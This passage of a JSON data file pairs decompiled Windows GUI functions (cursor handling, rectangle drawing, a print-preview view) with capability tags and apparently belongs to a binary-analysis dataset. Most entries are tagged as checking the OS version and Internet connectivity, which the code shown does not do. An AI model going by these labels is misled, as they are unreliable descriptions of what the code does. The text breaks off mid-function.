        "decompiled_code": "\nvoid __cdecl fcn.00427ed1(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    uint *arg_8h_00;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    int32_t *piVar5;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t lprc;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    piVar2 = arg_8h;\n    var_8h = in_ECX;\n    (**(*arg_8h + 0x1c))();\n    (**(*arg_8h + 0x34))(1);\n    (**(*arg_8h + 0x38))(&var_10h, 0, 0);\n    arg_8h_00 = &var_10h;\n    fcn.0042dc0d(arg_8h_00, 0, 0);\n    lprc = in_ECX[2];\n    var_1ch = in_ECX[3];\n    var_18h = in_ECX[4];\n    var_14h = in_ECX[5];\n    fcn.00410ad0();\n    piVar5 = var_8h;\n    var_4h = 0;\n    arg_8h = NULL;\n    if ((var_8h[1] & 3U) != 0) {\n        if ((var_8h[1] & 2U) == 0) {\n            var_4h = (**(*piVar2 + 0x24))(7);\n        }\n        else {\n            uVar3 = fcn.0042e42a(*0x4bb24c);\n            var_4h = fcn.0042e58b(uVar3);\n        }\n        arg_8h = (**(*piVar2 + 0x24))(5);\n        arg_8h_00 = fcn.0042d298(0xd);\n        (*_sym.imp.USER32.dll_InflateRect)(&lprc, 1, 1);\n        fcn.00427801(lprc, var_1ch, var_18h, var_14h);\n        fcn.0042d298(arg_8h_00);\n    }\n    if ((*(piVar5 + 1) & 0x24) != 0) {\n        (*_sym.imp.GDI32.dll_UnrealizeObject)(*0x4bb248);\n    }\n    if ((*(piVar5 + 1) & 0x20) != 0) {\n        iVar4 = (**(*piVar2 + 0x24))(8);\n        if (var_4h == 0) {\n            var_4h = iVar4;\n        }\n        uVar3 = fcn.0042e42a(*0x4bb248);\n        iVar4 = fcn.0042e5d1(uVar3);\n        if (arg_8h == NULL) {\n            arg_8h = iVar4;\n        }\n        fcn.0042d23c(1);\n        arg_8h_00 = fcn.0042d298(3);\n        fcn.00427801(lprc + 1, var_1ch + 1, var_18h, var_14h);\n        fcn.0042d298(arg_8h_00);\n    }\n    if ((*(piVar5 + 1) & 4) != 0) {\n        uVar3 = fcn.0042e42a(*0x4bb248);\n        iVar4 = fcn.0042e5d1(uVar3);\n        if (arg_8h == NULL) {\n            arg_8h = iVar4;\n        }\n        fcn.0042d23c(2);\n        fcn.00427b70(&var_30h);\n        pcVar1 = _sym.imp.GDI32.dll_PatBlt;\n        var_ch = var_28h - var_30h;\n        (*_sym.imp.GDI32.dll_PatBlt)(piVar2[1], var_30h, var_2ch, var_ch, var_1ch - var_2ch, 0xf0001);\n        (*pcVar1)(piVar2[1], var_30h, var_14h, var_ch, var_24h - var_14h, 0xf0001);\n        (*pcVar1)(piVar2[1], var_30h, var_1ch, lprc - var_30h, var_14h - var_1ch, 0xf0001);\n        (*pcVar1)(piVar2[1], var_18h, var_1ch, var_28h - var_18h, var_14h - var_1ch, 0xf0001);\n        piVar5 = var_8h;\n    }\n    if ((*(piVar5 + 1) & 0x18) != 0) {\n        var_ch = (**(*piVar5 + 0xc))();\n        iVar4 = 0;\n        do {\n            if ((var_ch & 1 << (iVar4 & 0x1f)) != 0) {\n                fcn.00427bc2(iVar4, &lprc);\n                arg_8h_00 = &lprc;\n                fcn.00438b19();\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 8);\n    }\n    if (var_4h != 0) {\n        fcn.0042e58b(var_4h, arg_8h_00);\n    }\n    if (arg_8h != NULL) {\n        fcn.0042e5d1(arg_8h);\n    }\n    (**(*piVar2 + 0x20))(0xffffffff);\n    return;\n}\n",
        "token_count": 1379
    },
    "0042812e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042812e(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    int32_t lpPoint;\n    int32_t var_4h;\n    \n    if (arg_ch != 1) {\n        return 0;\n    }\n    lpPoint = in_ECX;\n    var_4h = in_ECX;\n    (*_sym.imp.USER32.dll_GetCursorPos)(&lpPoint);\n    (*_sym.imp.USER32.dll_ScreenToClient)(*(arg_8h + 0x20), &lpPoint);\n    iVar1 = fcn.00427cee(lpPoint, var_4h);\n    if (iVar1 < 0) {\n        return 0;\n    }\n    uVar2 = fcn.00427a40(iVar1);\n    if (uVar2 == 8) {\n        iVar1 = (*_sym.imp.USER32.dll_PtInRect)(in_ECX + 8, lpPoint, var_4h);\n        if ((iVar1 != 0) || ((*(in_ECX + 4) & 4) == 0)) goto code_r0x004281a2;\n        uVar2 = 9;\n    }\n    if (9 < uVar2) {\n        fcn.00411e42();\n    }\ncode_r0x004281a2:\n    (*_sym.imp.USER32.dll_SetCursor)(*(uVar2 * 4 + 0x4bb220));\n    return 1;\n}\n",
        "token_count": 347
    },
    "00428601": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00428601(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *var_4h;\n    \n    var_4h = param_1;\n    var_4h = (**(*param_1 + 0x60))();\n    do {\n        if (var_4h == NULL) {\n            uVar2 = (**(*param_1 + 0x90))();\n            return uVar2;\n        }\n        (**(*param_1 + 100))(&var_4h);\n        iVar1 = fcn.00419143();\n    } while ((iVar1 == 0) || (*(iVar1 + 0x58) < 1));\n    return 1;\n}\n",
        "token_count": 167
    },
    "004286f6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004286f6(int32_t *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *in_ECX;\n    int32_t var_4h;\n    \n    var_4h = (**(*in_ECX + 0x60))();\n    while (var_4h != 0) {\n        piVar1 = (**(*in_ECX + 100))(&var_4h);\n        if (piVar1 != arg_8h) {\n            (**(*piVar1 + 0x168))(arg_8h, arg_ch, arg_10h);\n        }\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "00428737": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00428737(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *var_4h;\n    \n    var_4h = param_1;\n    var_4h = (**(*param_1 + 0x60))();\n    while (var_4h != NULL) {\n        piVar1 = (**(*param_1 + 100))(&var_4h);\n        (**(*piVar1 + 0x15c))();\n    }\n    return;\n}\n",
        "token_count": 118
    },
    "00428768": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00428768(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    \n    iVar1 = fcn.00411703(arg_8h, arg_ch, arg_10h, arg_14h);\n    if (iVar1 == 0) {\n        if (*(in_ECX + 0x28) != 0) {\n            iVar1 = (**(**(in_ECX + 0x28) + 0xc))(arg_8h, arg_ch, arg_10h, arg_14h);\n            if (iVar1 != 0) goto code_r0x00428783;\n        }\n        uVar2 = 0;\n    }\n    else {\ncode_r0x00428783:\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 207
    },
    "00428806": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00428806(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *(param_1 + 0x38);\n    while (iVar1 != 0) {\n        iVar1 = fcn.0043308d();\n        *(iVar1 + 0x54) = 0;\n        iVar1 = *(param_1 + 0x38);\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "0042897a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042897a(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t *piVar3;\n    uint uStack20;\n    \n    iVar1 = param_1[0x13];\n    param_1[0x13] = 0;\n    while( true ) {\n        if (param_1[0xe] == 0) {\n            param_1[0x13] = iVar1;\n            (**(*param_1 + 0x6c))();\n            if (param_1[0x13] != 0) {\n                uStack20 = 0x4289ca;\n                (**(*param_1 + 4))();\n            }\n            return;\n        }\n        piVar3 = fcn.00419143();\n        if (piVar3 == NULL) break;\n        uStack20 = 0x4289a4;\n        (**(*param_1 + 0x94))();\n        uStack20 = 0x4289ab;\n        (**(*piVar3 + 0x60))();\n    }\n    uStack20 = 0x4b62b8;\n    fcn.0046230a(&stack0xffffffec, 0x4a76e8);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 302
    },
    "00428ac6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00428ac6(void)\n\n{\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *(unaff_EBP + -4) = 3;\n    fcn.00428806();\n    if (*(extraout_ECX + 0x28) != 0) {\n        (**(**(extraout_ECX + 0x28) + 0x60))(extraout_ECX);\n    }\n    *(unaff_EBP + -4) = 2;\n    fcn.00433188();\n    fcn.00402740();\n    fcn.00402740();\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00411a01();\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 230
    },
    "00428be6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00428be6(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    if (arg_ch < 0) {\n        arg_ch = 0;\n    }\n    if (arg_10h < 0) {\n        arg_10h = 0;\n    }\n    iVar1 = *(*in_ECX + -0xc);\n    iVar2 = fcn.00428a10(arg_ch, arg_10h);\n    if (iVar1 < iVar2) {\n        arg_10h = *(*in_ECX + -0xc) - arg_ch;\n    }\n    iVar1 = *in_ECX;\n    iVar2 = *(iVar1 + -0xc);\n    if (iVar2 < arg_ch) {\n        arg_10h = 0;\n    }\n    if ((arg_ch == 0) && (arg_10h == iVar2)) {\n        fcn.0041d1b4();\n    }\n    else {\n        uVar3 = fcn.0042652b();\n        fcn.00428a59(iVar1 + arg_ch, arg_10h, uVar3);\n    }\n    return arg_8h;\n}\n",
        "token_count": 299
    },
    "00428d11": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.00428d11(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(8);\n    iVar2 = (**(*extraout_ECX + 0x58))();\n    if (iVar2 == 0) goto code_r0x00428e0d;\n    uVar3 = fcn.0042407a();\n    fcn.0040f840(uVar3);\n    *(unaff_EBP + -4) = 0;\n    piVar1 = extraout_ECX + 9;\n    if (*(*piVar1 + -0xc) == 0) {\n        fcn.0041d369(extraout_ECX + 8);\n        iVar2 = *(unaff_EBP + -0x10);\n        if (*(iVar2 + -0xc) == 0) {\n            fcn.0040f670(0xf003);\n            goto code_r0x00428d99;\n        }\n    }\n    else {\n        fcn.0041d369(piVar1);\n        uVar3 = fcn.0040f8a0(0x104);\n        fcn.0043fa4c(*piVar1, uVar3, 0x104);\n        fcn.00414de4(0xffffffff);\ncode_r0x00428d99:\n        iVar2 = *(unaff_EBP + -0x10);\n    }\n    uVar3 = fcn.0042407a();\n    fcn.0040f840(uVar3);\n    *(unaff_EBP + -4) = 1;\n    fcn.00431fc9(unaff_EBP + -0x14, 0xf103, iVar2);\n    iVar2 = fcn.00426240(*(unaff_EBP + -0x14), 3, 0xf103);\n    if ((iVar2 == 2) || ((iVar2 == 6 && (iVar2 = (**(*extraout_ECX + 0x9c))(),  iVar2 == 0)))) {\n        fcn.00402740();\n        fcn.00402740();\n    }\n    else {\n        fcn.00402740();\n        fcn.00402740();\n    }\ncode_r0x00428e0d:\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 606
    },
    "00428e30": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00428e30(uint lpString, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint arg_8h;\n    uint var_208h;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4b8030 ^ &stack0xfffffffc;\n    iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString);\n    if (iVar1 < 0x104) goto code_r0x00428e63;\n    do {\n        fcn.004416ff(3, 0xffffffff, 0);\ncode_r0x00428e63:\n        iVar1 = fcn.0043ff96(&var_108h, lpString);\n    } while (iVar1 == 0);\n    fcn.00413a3a(&var_108h);\n    in_ECX[0x14] = 0;\n    arg_8h = 0x100;\n    iVar1 = fcn.0043fa4c(&var_108h, &var_208h, 0x100);\n    if (iVar1 == 0) {\n        (**(*in_ECX + 0x50))(&var_208h);\n    }\n    if (arg_ch != 0) {\n        iVar1 = fcn.0043026e();\n        (**(**(iVar1 + 4) + 0x8c))(in_ECX[9]);\n    }\n    fcn.0045e747(arg_8h);\n    return;\n}\n",
        "token_count": 350
    },
    "0042961b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042961b(uint arg_8h, char *arg_ch, int32_t *arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t arg_10h_00;\n    uint uVar4;\n    int32_t *in_ECX;\n    uint32_t uVar5;\n    ulong uVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *arg_10h;\n    if (iVar3 < 0) {\n        uVar6 = fcn.00401280(0x80070057);\n        iVar3 = uVar6 >> 0x20;\n        in_ECX = uVar6;\n    }\n    if ((arg_ch == NULL) || (*arg_ch == '\\0')) {\n        iVar2 = *in_ECX;\n        if (iVar3 < *(iVar2 + -0xc)) {\n            uVar4 = fcn.0042652b();\n            fcn.004292a1(*arg_10h + iVar2, uVar4);\n            return arg_8h;\n        }\n    }\n    else {\n        iVar2 = *in_ECX;\n        uVar1 = iVar2 + iVar3;\n        uVar5 = *(iVar2 + -0xc) + iVar2;\n        if (uVar1 < uVar5) {\n            iVar3 = fcn.0046432f(uVar1, arg_ch);\n            if (uVar1 + iVar3 < uVar5) {\n                arg_10h_00 = fcn.00464407(uVar1 + iVar3, arg_ch);\n                iVar2 = *arg_10h;\n                *arg_10h = iVar2 + iVar3 + 1 + arg_10h_00;\n                fcn.00428be6(arg_8h, iVar2 + iVar3, arg_10h_00);\n                return arg_8h;\n            }\n        }\n    }\n    *arg_10h = -1;\n    uVar4 = fcn.0042652b();\n    fcn.0040f840(uVar4);\n    return arg_8h;\n}\n",
        "token_count": 481
    },
    "00429f06": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "contain loop"
        ],
        "decompiled_code": "\nuint * fcn.00429f06(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint unaff_retaddr;\n    \n    if (param_1 == 0) {\n        fcn.00411e42();\n    }\n    iVar1 = fcn.0043026e();\n    fcn.0043039f(0);\n    puVar2 = *(iVar1 + 0x1c);\n    while( true ) {\n        if (puVar2 == NULL) {\n            fcn.0043040c(0);\n            return NULL;\n        }\n        iVar1 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(unaff_retaddr, *puVar2);\n        if (iVar1 == 0) break;\n        puVar2 = puVar2[5];\n    }\n    fcn.0043040c(0);\n    return puVar2;\n}\n",
        "token_count": 201
    },
    "0042a214": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0042a214(void)\n\n{\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *(unaff_EBP + -4) = 0;\n    if ((*(extraout_ECX + 0x24) != 0) && ((*(extraout_ECX + 0x18) & 2) == 0)) {\n        fcn.00429fc9();\n    }\n    fcn.004299e8();\n    fcn.00402740();\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 167
    },
    "0042a83b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0042a83b(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EDI;\n    \n    if (param_1 == 0) {\n        fcn.00411e42();\n    }\n    pcVar1 = _sym.imp.USER32.dll_GetParent;\n    uVar2 = (*_sym.imp.USER32.dll_GetParent)(*(param_1 + 0x20));\n    uVar2 = fcn.004185c5(uVar2);\n    iVar3 = fcn.0042f538(0x495620);\n    if (iVar3 != 0) {\n        if (unaff_EDI != 0) {\n            return uVar2;\n        }\n        do {\n            uVar4 = (*pcVar1)(*(param_1 + 0x20));\n            param_1 = fcn.004185c5(uVar4);\n            if (param_1 == 0) {\n                return uVar2;\n            }\n            iVar3 = (*_sym.imp.USER32.dll_IsIconic)(*(param_1 + 0x20));\n        } while (iVar3 == 0);\n    }\n    return 0;\n}\n",
        "token_count": 279
    },
    "0042ae23": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.0042ae23(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CPreviewView.0;\n    *(unaff_EBP + -4) = 1;\n    fcn.0042e1a4();\n    pcVar1 = extraout_ECX[0x4d];\n    if (pcVar1 != NULL) {\n        fcn.0042c73b();\n        fcn.004115a4(pcVar1);\n    }\n    fcn.004115a4(extraout_ECX[0x2a]);\n    if (extraout_ECX[0x24] != NULL) {\n        (**(*extraout_ECX[0x24] + 4))(1);\n    }\n    if (extraout_ECX[0x48] != NULL) {\n        uVar2 = (*_sym.imp.USER32.dll_LoadCursorA)(0, 0x7f00);\n        (*_sym.imp.USER32.dll_SetCursor)(uVar2);\n        (*_sym.imp.USER32.dll_DestroyCursor)(extraout_ECX[0x48]);\n    }\n    *(unaff_EBP + -4) = 0;\n    fcn.0042e1eb();\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00441840();\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 397
    },
    "0042af8c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042af8c(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    \n    uVar1 = fcn.00419143();\n    iVar2 = fcn.0042f550(0x494070, uVar1);\n    if (iVar2 == 0) {\n        uVar1 = fcn.004122c3();\n    }\n    uVar1 = fcn.0042f550(0x494070, uVar1);\n    if ((*(param_1 + 0xac) != 0) && (*(*(param_1 + 0xac) + 0x54) != 0)) {\n        iVar2 = fcn.0042f550(0x4991f8, uVar1);\n        if ((iVar2 != 0) && (*(param_1 + 0x54) != 0)) {\n            piVar3 = fcn.0042f550(0x499030, *(param_1 + 0x54));\n            if (piVar3 != NULL) {\n                (**(**(param_1 + 0xac) + 0x60))();\n                *(param_1 + 0xac) = 0;\n                *(iVar2 + 0x140) = 0;\n                (**(*piVar3 + 0x110))(1);\n            }\n        }\n    }\n    if (*(param_1 + 0xac) != NULL) {\n        (**(**(param_1 + 0xac) + 0x60))();\n    }\n    *(param_1 + 0xac) = 0;\n    *(*(param_1 + 0x134) + 0x14) = *(param_1 + 0x114);\n    (**(**(param_1 + 0x88) + 0x180))(*(param_1 + 0x90), *(param_1 + 0x134), 0, 0, param_1);\n    return;\n}\n",
        "token_count": 446
    },
    "0042b095": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0042b095(int32_t *arg_8h)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t var_8h;\n    \n    var_8h = in_ECX;\n    fcn.00442421(arg_8h, &var_8h);\n    if (*(in_ECX + 0x10c) == 0) {\n        iVar2 = *(**(in_ECX + 0x134) + 0x74);\n        iVar1 = *(iVar2 + 0x1e);\n        if ((iVar1 != -1) && (iVar1 != *(iVar2 + 0x1c))) {\n            *arg_8h = *arg_8h - var_8h;\n        }\n    }\n    *(in_ECX + 0x11c) = (*arg_8h + -8) / 2;\n    if (*(in_ECX + 0x118) == 2) {\n        iVar2 = (*arg_8h + -0x18) / 2;\n    }\n    else {\n        iVar2 = *arg_8h + -0x10;\n    }\n    arg_8h[1] = arg_8h[1] + -0x10;\n    *arg_8h = iVar2;\n    return arg_8h;\n}\n",
        "token_count": 308
    },
    "0042b110": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042b110(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t in_ECX;\n    int32_t *piVar7;\n    uint xRight;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar6 = arg_8h * 0x28 + *(in_ECX + 0xb0);\n    fcn.0042b095(&var_8h);\n    iVar5 = *(iVar6 + 0x24);\n    iVar1 = *(in_ECX + 0x10c);\n    bVar2 = iVar5 <= *(iVar6 + 0x20);\n    if (iVar1 == 0) {\n        *(iVar6 + 0x18) = *(iVar6 + 0x20);\n        uVar4 = *(iVar6 + 0x24);\ncode_r0x0042b190:\n        *(iVar6 + 0x1c) = uVar4;\n    }\n    else {\n        if (iVar1 == 1) {\n            *(iVar6 + 0x1c) = iVar5;\n            if (bVar2) {\n                iVar5 = *(iVar6 + 0x20) * 3 - iVar5;\n            }\n            else {\n                iVar5 = *(iVar6 + 0x20) + iVar5;\n            }\n            iVar5 = iVar5 / 2;\n        }\n        else {\n            if (iVar1 != 2) goto code_r0x0042b193;\n            if (!bVar2) {\n                uVar4 = 1;\n                *(iVar6 + 0x18) = 1;\n                goto code_r0x0042b190;\n            }\n            *(iVar6 + 0x1c) = iVar5;\n            iVar5 = *(iVar6 + 0x20) * 2 - *(iVar6 + 0x24);\n        }\n        *(iVar6 + 0x18) = iVar5;\n    }\ncode_r0x0042b193:\n    iVar5 = (*_sym.imp.KERNEL32.dll_MulDiv)(*(iVar6 + 0x10), *(iVar6 + 0x18), *(iVar6 + 0x1c));\n    iVar6 = (*_sym.imp.KERNEL32.dll_MulDiv)(*(iVar6 + 0x14), *(iVar6 + 0x18), *(iVar6 + 0x1c));\n    piVar7 = *(in_ECX + 0xb0) + arg_8h * 0x28;\n    (*_sym.imp.USER32.dll_SetRect)(piVar7, 8, 8, iVar5 + 0xb, iVar6 + 0xb);\n    pcVar3 = _sym.imp.USER32.dll_OffsetRect;\n    if (*(in_ECX + 0x10c) == 0) {\n        (*_sym.imp.USER32.dll_OffsetRect)\n                  (piVar7, ((*piVar7 - piVar7[2]) + var_8h) / 2 + -1, ((piVar7[1] - piVar7[3]) + var_4h) / 2 + -1);\n        if (arg_8h == 1) {\n            (*pcVar3)(piVar7, *(in_ECX + 0x11c), 0);\n        }\n    }\n    else {\n        fcn.00442c49(1, (piVar7[2] - *piVar7) + 0x10, (piVar7[3] - piVar7[1]) + 0x10, &var_8h, 0x498bbc);\n    }\n    return;\n}\n",
        "token_count": 840
    },
    "0042b31a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042b31a(int32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint var_8h;\n    \n    if (*(in_ECX + 0x10c) != 0) {\n        piVar1 = fcn.00442078(&var_8h);\n        iVar2 = piVar1[1];\n        *arg_8h = *arg_8h + *piVar1;\n        arg_8h[1] = arg_8h[1] + iVar2;\n    }\n    *arg_ch = 0;\n    if (*(in_ECX + 0x118) != 0) {\n        do {\n            iVar2 = (*_sym.imp.USER32.dll_PtInRect)(*arg_ch * 0x28 + *(in_ECX + 0xb0), *arg_8h, arg_8h[1]);\n            if (iVar2 != 0) {\n                iVar2 = *(*arg_ch * 0x28 + *(in_ECX + 0xb0));\n                arg_8h[1] = arg_8h[1] - *(*arg_ch * 0x28 + 4 + *(in_ECX + 0xb0));\n                *arg_8h = *arg_8h - iVar2;\n                iVar2 = *arg_ch * 0x28 + *(in_ECX + 0xb0);\n                iVar2 = (*_sym.imp.KERNEL32.dll_MulDiv)(*arg_8h, *(iVar2 + 0x1c), *(iVar2 + 0x18));\n                *arg_8h = iVar2;\n                iVar2 = 